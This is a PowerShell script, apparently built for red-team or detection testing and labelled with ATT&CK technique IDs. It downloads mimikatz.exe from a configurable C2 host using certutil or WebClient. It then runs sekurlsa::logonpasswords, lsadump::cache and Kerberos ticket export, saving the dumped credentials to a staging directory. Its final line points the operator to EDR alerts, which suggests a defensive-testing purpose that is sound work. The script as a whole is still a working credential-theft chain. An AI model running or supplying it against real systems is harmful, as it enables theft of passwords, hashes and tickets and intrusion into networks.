$ErrorActionPreference = "SilentlyContinue"
$C2Host = if ($env:C2_HOST) { $env:C2_HOST } else { "127.0.0.1" }

Write-Host "[*] Starting Credential Access - Mimikatz Credential Dump..." -ForegroundColor Cyan

# T1003.001 - OS Credential Dumping: LSASS Memory
# Downloads and executes Mimikatz for credential harvesting

Write-Host "[*] [T1003.001] Mimikatz credential dump - sekurlsa::logonpasswords" -ForegroundColor Yellow
Write-Host "[!] Requires: Local Administrator privileges" -ForegroundColor Yellow

$stagingDir = "C:\temp\staging"
New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null
$mimikatzPath = "$stagingDir\mimikatz.exe"

# Step 1: Download Mimikatz via certutil (LOLBin chain)
Write-Host "`n[*] [T1105] Downloading Mimikatz via certutil..."
Write-Host "    CMD: certutil -urlcache -split -f http://$C2Host/tools/mimikatz.exe $mimikatzPath"
certutil -urlcache -split -f "http://$C2Host/tools/mimikatz.exe" $mimikatzPath

if (-not (Test-Path $mimikatzPath)) {
    Write-Host "[-] Mimikatz download failed. Trying PowerShell WebClient..." -ForegroundColor Red
    try {
        (New-Object System.Net.WebClient).DownloadFile("http://$C2Host/tools/mimikatz.exe", $mimikatzPath)
    } catch {
        Write-Host "[-] All download methods failed. Ensure C2 is hosting mimikatz.exe" -ForegroundColor Red
    }
}

if (Test-Path $mimikatzPath) {
    Write-Host "[+] Mimikatz downloaded successfully" -ForegroundColor Green
    
    # Step 2: Execute Mimikatz commands
    Write-Host "`n[*] [T1003.001] Executing Mimikatz sekurlsa::logonpasswords..."
    Write-Host "    CMD: mimikatz.exe `"privilege::debug`" `"sekurlsa::logonpasswords`" `"exit`""
    
    $outputFile = "$stagingDir\creds_output.txt"
    & $mimikatzPath "privilege::debug" "sekurlsa::logonpasswords" "exit" 2>&1 | Tee-Object -FilePath $outputFile
    
    if (Test-Path $outputFile) {
        $lineCount = (Get-Content $outputFile | Measure-Object).Count
        Write-Host "`n[+] Credential dump output saved: $outputFile ($lineCount lines)" -ForegroundColor Green
    }
    
    # Step 3: Additional Mimikatz modules
    Write-Host "`n[*] [T1003.004] Extracting cached credentials..."
    Write-Host "    CMD: mimikatz.exe `"lsadump::cache`" `"exit`""
    & $mimikatzPath "privilege::debug" "lsadump::cache" "exit" 2>&1

    Write-Host "`n[*] [T1003.003] Extracting Kerberos tickets..."
    Write-Host "    CMD: mimikatz.exe `"kerberos::list /export`" `"exit`""
    & $mimikatzPath "kerberos::list /export" "exit" 2>&1

} else {
    Write-Host "[-] Cannot execute - Mimikatz binary not available" -ForegroundColor Red
    Write-Host "[!] Ensure http://$C2Host/tools/mimikatz.exe is accessible" -ForegroundColor Yellow
}

Write-Host "`n[+] Mimikatz Credential Dump Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: mimikatz.exe execution, LSASS access, credential dumping alerts" -ForegroundColor Yellow
